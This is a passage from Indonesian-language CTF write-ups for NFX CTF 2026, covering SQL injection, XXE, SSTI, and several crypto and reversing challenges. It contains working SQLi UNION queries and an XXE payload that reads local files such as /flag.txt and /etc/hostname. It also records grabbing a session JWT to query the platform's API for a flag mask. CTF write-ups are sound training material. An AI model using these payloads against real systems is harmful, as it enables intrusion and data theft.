(`''.__class__.__mro__`/`subclasses` juga bisa; payload di atas langsung.)

#### Kandidat flag

`NFX{j1nja2_sstI_rce_v1a_gl0bals}` - prefix `NFX{}` , hasil `cat /flag.txt`
di container service (bukan tebakan). Hanya 1 kandidat di file.

> Catatan: laporan pertama sempat typo (`sstI_r1a`), sudah dikoreksi.
> Flag final = di atas.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{j1nja2_sstI_rce_v1a_gl0bals}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexacommerce"></a>
# NFX CTF 2026 - NexaCommerce

* **Kategori:** Web
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{sql1_un10n_bas3d_4uth_byp4ss}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![img](https://media.giphy.com/media/NGN8hRTijoR3KEB4Hq/giphy.gif)

**NexaCommerce Order Lookup** adalah toko elektronik online tempat pelanggan dapat melihat katalog, mengelola akun, memantau riwayat pesanan, melacak kiriman, dan menghubungi dukungan. Data toko diisi dengan pelanggan, produk, dan pesanan yang lengkap.

Tim platform baru-baru ini melihat aktivitas tidak biasa di halaman akun dan pelacakan pesanan. Mereka meminta review independen sebelum rilis berikutnya.

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/01_nexacommerce` (key: `NFXCTF-NFCC-NXCTF-2026`)
 **PORT BERUBAH tiap service restart - JANGAN hardcode. Cek port terkini:**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama_service>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# bila status=stopped -> action:up dulu; TTL hampir habis -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Flask dengan halaman login, register, katalog produk, /track untuk melacak order, dan /support. Recon awal memetakan route dan menguji hipotesis umum satu per satu: register akun uji memberi session role:customer, mass assignment role=admin tidak berubah, login SQLi ' OR '1'='1 ditolak (parameterized), IDOR /account?user_id=1 mengembalikan konten yang sama, dan {{7*7}} direfleksikan literal (bukan SSTI). Flag: `NFX{sql1_un10n_bas3d_4uth_byp4ss}`.

**Pemahaman inti:** Login dan IDOR sudah aman, tetapi parameter `order_code` di `/track` masuk mentah ke query. SQLi UNION 3 kolom membuka tabel `messages`, dan pesan privat admin berisi flag.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Flask dengan halaman login, register, katalog produk, `/track` untuk melacak order, dan `/support`. Recon awal memetakan route dan menguji hipotesis umum satu per satu: register akun uji memberi session `role:customer`, mass assignment `role=admin` tidak berubah, login SQLi `' OR '1'='1` ditolak (parameterized), IDOR `/account?user_id=1` mengembalikan konten yang sama, dan `{{7*7}}` direfleksikan literal (bukan SSTI). Semua jalur itu dicatat sebagai buntu. Perhatian lalu beralih ke fitur yang memproses input terstruktur, yaitu `/track` dengan `order_code`. Baseline `NX-10001` memberi 1 hasil, sedangkan `' OR '1'='1` memberi 41 hasil, yang membuktikan injeksi. `' UNION SELECT 1,2,3--` menentukan jumlah kolom, `sqlite_master` mengungkap lima tabel, dan tabel `messages` menyimpan pesan privat `is_private=1` dari user admin yang berisi flag.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:30-09:52Z - SELESAI (SQLi UNION → pesan privat berisi flag)**

#### Service (PORT BERUBAH - selalu inspect)

```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=NFX%2Fweb%2F01_nexacommerce" -H "$K"
# → port 42728, running; extend 2× (493s → 1358s → 1432s) sebelum exploit
```
Artefak sesi: `platform_tools/r2/` (cookie jar `nc_session.jar`, helper `uni.py`).

#### Probe (urutan, kecil dulu)

1. GET `/` 200 (Werkzeug/Flask), link: `/login`, `/register`, `/products`,
   `/track`, `/support`. Halaman login **tanpa** kredensial demo.
2. Path enum (`admin|api|flag|flag.txt|.git|console|__debugger__|.env|robots.txt`) → **semua 404**;
   `/static/css/../..` jatuh ke homepage (tak ada traversal nyata).
3. Register akun uji `kojprobe@example.com` → **302 /account**, session payload
   `{"full_name":"KoJ Probe","role":"customer","user_id":33}`.
   - Mass-assignment probe (`role=admin|staff`, `is_admin=1`, `admin=1`,
     `user_type=admin`) → **semua tetap `role:customer`** bukan jalurnya.
4. Login SQLi (`' OR '1'='1`) → `Invalid email or password.` (parameterized).
5. IDOR `/account?user_id=1` → konten identik (3320 B) .
6. Refleksi/SSTI: `{{7*7}}` di `full_name` & `order_code` direfleksikan **literal**
   (`Welcome back, {{7*7}}`) → **bukan SSTI** .

#### EXPLOIT - SQLi di `/track` (order_code)

```
POST /track order_code=...
NX-10001 → 200 "1 match" (baseline )
NX-10001' → tak ada section "Results" (path error)
NX-100% , % → "0 matches" → bukan LIKE; query = order_code = '<input>'
' OR '1'='1 → "41 matches" ← injeksi jalan, dump semua order
' UNION SELECT 1,2,3-- → sel jadi 1 | 2 | 3 ← UNION 3 kolom
' UNION SELECT name,sql,3 FROM sqlite_master--
                    → 5 tabel: messages, orders, products, sqlite_sequence, users
' UNION SELECT 1,2,sqlite_version()-- → 3.46.1 (SQLite)
```
Helper: `python3 platform_tools/r2/uni.py "<payload>"`

#### Ekstraksi data

- `users` (40 baris): admin `id=1 admin@nexacommerce.test role=admin`
  (hash `e09209ba…561c`), sisanya customer dengan hash identik
  `61e2d7af…40110` (tak perlu di-crack - bukan jalur flag).
- **Cari flag di `messages`:**
```
' UNION SELECT id||' u'||user_id||' '||sender, subject||' / '||substr(body,1,200), is_private
  FROM messages WHERE body LIKE '%NFX%' OR subject LIKE '%NFX%' OR body LIKE '%flag%'--
→ 1 match:
  31 u1 system | Internal audit follow-up / Finance and platform team: rotate the
  production API keys before Friday. Temporary recovery flag for the audit console:
  NFX{sql1_un10n_bas3d_4uth_byp4ss} | is_private=1
```
→ pesan **privat** (is_private=1, sender `system`, user_id 1=admin) - persis
"aktivitas tidak biasa di halaman akun" dari deskripsi.

#### Kandidat flag

`NFX{sql1_un10n_bas3d_4uth_byp4ss}` - prefix `NFX{}` , diambil langsung dari
DB via UNION (bukan tebakan). Cek dekoi: LIKE `%NFX%` hanya 1 baris di seluruh tabel.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{sql1_un10n_bas3d_4uth_byp4ss}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexasupply"></a>
# NFX CTF 2026 - NexaSupply

* **Kategori:** Web
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

**NexaSupply** adalah portal supplier untuk jaringan NexaCommerce. Supplier dapat masuk, meninjau katalog yang mereka publikasikan ke storefront, serta mengimpor pembaruan stok atau harga dari feed XML hasil ekspor ERP mereka.

![img](https://4kwallpapers.com/images/walls/thumbs_3t/9793.jpg)

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/04_nexasupply` (key: `NFXCTF-NFCC-NXCTF-2026`)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Flask dengan kredensial demo supplier@nexasupply.test / supply1234 dan fitur import XML di /import. Halaman import memuat hint eksplisit: importer masih menerima feed berbasis DTD dari jembatan ERP lama. Flag: `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`.

**Pemahaman inti:** Importer menerima feed berbasis DTD, dan entity eksternal dievaluasi. XXE `file:///flag.txt` langsung muncul di preview, tanpa perlu menembus login.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Flask dengan kredensial demo `supplier@nexasupply.test / supply1234` dan fitur import XML di `/import`. Halaman import memuat hint eksplisit: importer masih menerima feed berbasis DTD dari jembatan ERP lama. Hint itu mengarahkan recon ke parser XML, bukan ke form login. Probe pertama memakai feed valid untuk baseline (`PROBE-OK-1` menghasilkan 1 baris), lalu DOCTYPE dengan entity `SYSTEM file:///etc/hostname` menghasilkan hostname container di field Name dan Description, yang membuktikan entity dievaluasi dan isi file keluar di preview. Percobaan `file:///proc/self/environ` gagal karena NUL byte, tetapi justru membuktikan file dibaca sampai byte tersebut. Loop path pendek kemudian menemukan `/flag.txt` dan flag muncul di preview.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 08:47-08:56Z - SELESAI (flag ketemu via XXE)**

#### Probe

- `curl .../inspect&name=NFX%2Fweb%2F04_nexasupply` → **port 46035** (bukan
  46947 seperti di brief awal; 46947 → 502). Running, sisa TTL ~1567 dtk.
- GET `/` → HTTP 200, `Server: Werkzeug/3.1.9 Python/3.11.18` (Flask),
  3670 B. Ada `/login`, `/sample.xml`.
- Path enum (GET): `catalog|import|dashboard|logout` → **302** (perlu sesi);
  `admin|api|register|debug|console|robots.txt` → 404.
- GET `/login` → ada **kredensial demo tertulis di halaman**:
  `supplier@nexasupply.test / supply1234` (ini bukan celah, memang disiapkan).
- POST `/login` (multipart form) → **302 Location: /dashboard** + `Set-Cookie: session=…` (Flask session).
- GET `/dashboard` → supplier `PT Sinar Nusantara Elektronik` (Rani Kusuma),
  4 SKU, nav: `/catalog`, `/import`, `/imports`.
- GET `/import` → form `POST /import` `enctype=multipart/form-data`,
  field `feed` (file .xml) + textarea paste. **Hint eksplisit di halaman:**
  > *"Legacy compatibility - The importer still accepts **DTD-based feeds**
  > from the old ERP bridge."*

#### Probe-to-exploit

1. **Baseline (feed valid):** `PROBE-OK-1` → 200, `Import preview - 1 product row parsed` parser jalan.
2. **XXE probe:** DOCTYPE `<!ENTITY xxe SYSTEM "file:///etc/hostname">` →
   preview menampilkan `42fd0dae6af7` (hostname container) di field Name
   **dan** Description → **entity dievaluasi, isi file keluar di preview**
3. `file:///proc/self/environ` → error:
   `XML feed could not be parsed: Char 0x0 out of allowed range` (NUL byte;
   justru membuktikan isi file dibaca sampai byte NUL).
4. **Eksploit (loop kandidat path, 1 request/path):**
   - `file:///flag` → kosong/tidak ada
   - **`file:///flag.txt` → `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`** STOP

#### Payload final (reproduksi)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE products [ <!ENTITY e SYSTEM "file:///flag.txt"> ]>
<products>
  <product><sku>X</sku><name>&e;</name><category>Accessories</category>
  <description>d</description><price>1.00</price><stock>1</stock></product>
</products>
```
`curl -b session -F 'feed=@f.xml;type=application/xml' http://s1.nfx.my.id:46035/import`

#### Kandidat flag

`NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}` - format `NFX{...}` , baca langsung dari
`/flag.txt` di container service (bukan tebakan).

> Catatan: beberapa request preview mengirim SKU `PROBE-OK-1`/`X` - hanya
> preview (katalog berubah hanya kalau ada langkah commit); kalau katalog
> ikut berubah, itu efek samping normal interaksi challenge.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-black-box-protocol-n4t0"></a>
# NFX CTF 2026 - Black Box Protocol N4T0

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi pwn)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Kada

Sebuah jet tempur Sukhoi Su-30 terjatuh menyimpan pesan yang masih terselamatkan, kejadian ini terjadi di perbatasan negara aliansi nato

![gambar](https://tse4.mm.bing.net/th/id/OIP.mNIINUuvuAT0kjxVuXIHfAHaE0?r=0&pid=Api&h=220&P=0)



> Format: NFX{World_World_World_.....}

**Lampiran:**

- [flight_recovery_manifest.xlsx](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/BlackBoxProtocolN4T0/flight_recovery_manifest.xlsx) (type: file)

**Service / Target:**

- tidak ada

**Berkas di workspace:** `flight_recovery_manifest.xlsx`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa flight_recovery_manifest.xlsx dengan satu sheet Mail_Black_Box dan tanpa docProps. Pemeriksaan struktur internal tidak menemukan petunjuk di persons.xml atau drawing1.xml yang kosong; yang relevan justru isi sel dan formatnya. Flag: `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}`.

**Pemahaman inti:** Flag disusun dari tiga kolom manifest, bukan dari satu sel: kode hex 2 digit, label fonetik NATO, dan nilai ilmiah. Casing dan underscore mengikuti mask `Format: NFX{World_World_...}`.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa `flight_recovery_manifest.xlsx` dengan satu sheet `Mail_Black_Box` dan tanpa `docProps`. Pemeriksaan struktur internal tidak menemukan petunjuk di `persons.xml` atau `drawing1.xml` yang kosong; yang relevan justru isi sel dan formatnya. Kolom B memuat pasangan angka yang sebagian berupa numerik (`62`, `62.0`) dan sebagian berupa string hex (`6d`, `4f`, `5f`), yang menunjukkan data hex 2 digit. Kolom lain memberi label fonetik NATO dan nilai ilmiah (`numFmtId=11`, `0.0E+00`). Pemahaman kuncinya adalah flag dirakit dari beberapa kolom secara berurutan, lalu casing dan pemisah kata disesuaikan dengan mask pada deskripsi. Kandidat yang hanya memakai satu kolom sudah ditolak server, dan kandidat final memuat urutan lengkap `N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng`.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov 19:55 - Temuan kolom C + flag placeholder live

- **Kolom C BUKAN red herring.** Nilai C2..C4 adalah representasi desimal dari bit **float32 big-endian**:
  | sel | nilai xlsx | `struct.pack('>f', v)` | ASCII |
  |---|---|---|---|
  | C2 | `2.78842154354096E23` | `66 6c 30 41` | `fl0A` |
  | C3 | `7.07930905431442E31` | `74 5f 62 34` | `t_b4` |
  | C4 | `3.57380928075183E30` | `72 34 6e 67` | `r4ng` |
  → C = **`fl0At_b4r4ng`** (12 char). Decode diverifikasi ulang via Python, roundtrip cocok.
- Dengan A = `N4T0PH0N3T1C1N1`, B = `C0mbO_H3X_`, C = `fl0At_b4r4ng`.
- **Placeholder live** dari RPC `get_challenge_placeholder` (challenge `f72a1790…`, via
  `https://api.nxctf.my.id/rest/v1/rpc/` + anon key frontend + JWT KoJ yang baru di-grab):
  ```
  XXX{X0X0_Xx0x0x0x_0x0X0xxX_X0X_xx0Xx_x0x0xx}
  ```
  (fungsi mask platform: uppercase→`X`, lowercase→`x`, digit→`0`, `_`/`{}` tetap.)
- Mask 44 char itu **match PERSIS** dengan:
  ```
  NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}
  ```
  Yaitu A+B+C urutan kolom, separator kata A disisipkan, casing mengikuti mask:
  `N4T0` + `_` + `Ph0n3t1c` + `_` + `1n1C0mbO` + `_` + `H3X` + `_` + `fl0At` + `_` + `b4r4ng`.
- Kandidat lama ditolak karena casing/underscore beda - terutama `PH0N3T1C` vs `Ph0n3t1c`,
  `1N1` vs `1n1`, dan kolom C belum masuk sama sekali.
- **Status: FLAG READY - user submit manual** (agent tidak submit).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}`

**Status:** SOLVED - flag valid (first blood)

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-decode-balik"></a>
# NFX CTF 2026 - Decode Balik

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

Seorang teman mengirimkan gambar waifu favoritnya, tetapi sebelum dikirim ia mengacaknya menggunakan serangkaian recipe di CyberChef.

Admin penasaran ingin melihat gambar aslinya, tetapi yang tersisa hanyalah recipe encode dan hasil akhirnya.

Bisakah kamu membalik seluruh proses tersebut dan mengembalikan gambar waifu seperti semula?

![img](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/decode_balik/waifu.png)

**Lampiran:**

- [waifu.png](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/decode_balik/waifu.png) (type: file)
- [recipe](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')Zlib_Deflate('Dynamic%20Huffman%20Coding')To_Base64('A-Za-z0-9%2B/%3D')Generate_Image('Greyscale',1,780)&input=TkZYe1JFREVDVEVEfQ) (type: link)

**Berkas di workspace:** `waifu.png`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran waifu.png berukuran 780x586 dengan nilai R=G=B, yang menandakan gambar grayscale hasil generate, bukan foto asli. Deskripsi memberi petunjuk bahwa ada rantai encode, dan pemahaman awalnya adalah membaca gambar sebagai data, bukan sebagai visual. Flag: `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`.

**Pemahaman inti:** Gambar bukan foto, melainkan hasil render string: pikselnya menyimpan base64. Rantai encode dibalik dari piksel, dan flag ada sebagai teks di gambar hasil decode.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran `waifu.png` berukuran 780x586 dengan nilai R=G=B, yang menandakan gambar grayscale hasil generate, bukan foto asli. Deskripsi memberi petunjuk bahwa ada rantai encode, dan pemahaman awalnya adalah membaca gambar sebagai data, bukan sebagai visual. Piksel di-flatten row-major lalu diterjemahkan sebagai ASCII; hasilnya string base64 dengan rasio printable 0.999. Dari situ rantai CyberChef bisa direkonstruksi terbalik: `To_Base64 -> Zlib_Deflate -> To_Base64 -> Generate_Image(Greyscale,1,780)`. Artefak antara yang penting adalah magic `78 9c` setelah decode base64 pertama, yang memastikan langkah berikutnya adalah `zlib.decompress`, bukan base64 lagi. Setelah dua lapis, diperoleh JPEG asli 600x847 yang memuat flag sebagai teks di area kanan-tengah.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`

- Recipe (CyberChef, forward): `To_Base64 → Zlib_Deflate → To_Base64 → Generate_Image(Greyscale,1,780)` - input asli = gambar JPEG.
- Reverse chain (dikerjakan offline, Pillow + stdlib):
  1. Baca piksel `waifu.png` (780×586, R=G=B) → flatten row-major → string ASCII (base64, printable ratio 0.999).
  2. `base64.b64decode(s)` → data zlib (magic `78 9c`).
  3. `zlib.decompress(...)` → string base64 kedua (448.720 B).
  4. `base64.b64decode(...)` → **JPEG asli** (336.539 B, `ffd8ffe0`, 600×847).
- Flag **tertulis sebagai teks di dalam gambar** (area kanan-tengah, pegangan cangkir) → dibaca visual.
- Artefak: `platform_tools/decode_balik_stage2.bin`, `platform_tools/decode_balik_final.jpg`, `decode_balik_final_view.png`.
- 328 piksel alpha=0 tidak mengganggu (semua baris punya alpha=255, chain decode utuh).
- Catatan: `Generate_Image` di CyberChef = render string ke piksel; jadi "waifu" = gambar hasil render, flag ada di layer isi.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-twin-prime-lattice"></a>
# NFX CTF 2026 - Twin Prime Lattice

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: rio

Diberikan modulus RSA 2048-bit dengan dua faktor yang sangat berdekatan. Kamu juga mendapatkan 32 bit teratas dari salah satu faktor dan ciphertext flag.

Pulihkan faktor RSA dan dekripsi flag.

> Format: NXCTF{...}

**Lampiran:**

- [challenge.py](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Twin_Prime_Lattice/challenge.py) (type: file)
- [output.txt](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Twin_Prime_Lattice/output.txt) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `challenge.py` · `output.txt`

---

### 2. TL;DR (Ringkasan Singkat)

Soal memberi RSA dengan N, e, c, dan bocoran 32 bit MSB dari p. Judul dan deskripsi mengarah ke Coppersmith, tetapi sebelum membangun lattice ada baiknya memeriksa sifat N itu sendiri. Flag: `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`.

**Pemahaman inti:** Nama soal menyarankan lattice, tetapi selisih p dan q cukup kecil sehingga Fermat factorization menang pada iterasi pertama. Bocoran 32 bit MSB hanya menjadi verifikasi.

---

### 3. Analisis Awal (Recon / Discovery)

Soal memberi RSA dengan `N`, `e`, `c`, dan bocoran 32 bit MSB dari p. Judul dan deskripsi mengarah ke Coppersmith, tetapi sebelum membangun lattice ada baiknya memeriksa sifat N itu sendiri. Jika p dan q berdekatan, maka `a = isqrt(N)` dan `b^2 = a^2 - N` akan menjadi kuadrat sempurna dengan sedikit iterasi. Kenyataannya `b^2` sudah kuadrat sempurna pada iterasi pertama, yang berarti selisih p dan q hanya sekitar 255 bit. Pemahaman ini membuat serangan lattice dan brute 32 bit tidak diperlukan: setelah p dan q diperoleh, `p*q == N` dan `p >> (bitlen-32) == leak` dipakai sebagai verifikasi, lalu plaintext dihitung dengan `pow(c, pow(e, -1, (p-1)*(q-1)), N)`. Perlu diingat prefix flag soal ini `NXCTF{}`, bukan `NFX{}`.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`

- `a = isqrt(N)`; `b² = a²-N` perfect square pada **iterasi pertama** (0 iterasi tambahan, <0.1 ms) → Fermat factorization langsung kena karena q-p hanya 255 bit.
- Verifikasi: `p*q == N` dan `p >> (bitlen-32) == leak (4178899371)` - leak justru redundan.
- Dekripsi: `m = pow(c, pow(e, -1, (p-1)*(q-1)), N)` → `long_to_bytes(m)`.
- Coppersmith/brute-32bit-MSB **tidak diperlukan**.
- **Prefix flag `NXCTF{}`**, bukan `NFX{}` - periksa prefix per-soal sebelum lapor.

---

### 5. Flag & Verifikasi

**Flag:** `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-ghost-xor"></a>
# NFX CTF 2026 - Ghost XOR

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Candelena

Tim cyber kami berhasil mencegat sebuah pesan rahasia yang terenkripsi. Berdasarkan informasi intelijen, enkripsi yang digunakan hanya menggunakan operasi XOR berulang dengan kunci rahasia sepanjang **4 karakter**.

Beruntung bagi kita, mereka meninggalkan kode sumbernya. Bisakah kamu memecahkan kuncinya dan membaca isi pesan rahasia tersebut?

**Lampiran:**

- [chall.py](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Ghost_XOR/chall.py) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `chall.py`

---

### 2. TL;DR (Ringkasan Singkat)

Ciphertext di-XOR dengan key pendek yang berulang. chall.py menyebutkan prefix flag di komentar, dan informasi itu cukup untuk melakukan known-plaintext: 7 byte pertama plaintext (NFXCTF{) di-XOR dengan ciphertext menghasilkan potongan key, lalu polanya diperiksa. Flag: `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`.

**Pemahaman inti:** Key-nya periodik 4 karakter, `LOCK`. Known-plaintext 7 byte pertama sudah cukup menurunkannya, dan seluruh plaintext yang printable memastikan tidak perlu brute 256.

---

### 3. Analisis Awal (Recon / Discovery)

Ciphertext di-XOR dengan key pendek yang berulang. `chall.py` menyebutkan prefix flag di komentar, dan informasi itu cukup untuk melakukan known-plaintext: 7 byte pertama plaintext (`NFXCTF{`) di-XOR dengan ciphertext menghasilkan potongan key, lalu polanya diperiksa. Hasilnya key periodik 4 karakter, `LOCK`. Pemahaman pentingnya: dengan key periodik, tidak perlu brute 256 nilai; cukup verifikasi bahwa XOR seluruh ciphertext dengan `LOCK` menghasilkan teks printable dan byte key pada posisi 4 sampai 6 konsisten. Self-check ini juga memastikan tidak ada kandidat lain yang sama-sama valid.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`

- Probe known-plaintext: derive key 7 byte pertama dari prefix `NFXCTF{` (sesuai komentar chall.py) → `LOCKLOC` → period-4 = `LOCK`.
- Verifikasi self-check: xor ulang seluruh ciphertext dgn `LOCK` → seluruh plaintext printable & key[4..6] konsisten → **tanpa brute 256**.
- Perintah: `bytes(ct[i] ^ b"LOCK"[i % 4] for i in range(len(ct)))`
- Brief bilang "brute 8-bit", ternyata key 4-char periodik. Prefix flag soal ini `NFXCTF{}` (lihat header chall.py), bukan `NFX{}`.

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-easy-bash-layers"></a>
# NFX CTF 2026 - Easy Bash Layers

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Script bash ini melakukan tiga transformasi berlapis sebelum membandingkan hasilnya dengan nilai yang sudah dihitung. Tidak ada enkripsi sungguhan - hanya encoding, pembalikan urutan, dan ROT13.

> Format: NFX{...}

**Lampiran:**

- [easy_bash.sh](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Easy_01_Bash_Layers/easy_bash.sh) (type: file)

**Berkas di workspace:** `easy_bash.sh`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa script bash dengan fungsi check() yang membandingkan input pengguna terhadap string expected. Membaca fungsi itu memberi urutan transformasi yang jelas: input di-base64, lalu dibalik dengan rev, lalu diubah dengan tr ROT13, dan hasilnya harus sama dengan expected. Flag: `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`.

**Pemahaman inti:** Tiga layer-nya deterministik dan urutannya terlihat di kode: base64, reverse, ROT13. Flag cukup dihitung dengan membalik urutan dari string `expected`.

---

### 3. Analisis Awal (Recon / Discovery)

